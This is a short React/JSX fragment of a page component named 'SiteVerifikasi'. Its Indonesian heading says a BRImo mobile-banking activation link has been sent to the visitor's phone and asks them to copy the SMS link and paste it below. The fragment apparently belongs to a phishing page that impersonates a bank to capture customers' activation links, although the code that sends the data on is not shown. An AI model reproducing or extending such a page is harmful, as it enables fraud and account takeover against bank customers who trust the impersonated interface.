...
const SiteVerifikasi = ({btnClick}) => {
  ...
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        ...
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan lalu di tempel di bawah ini</h1>    
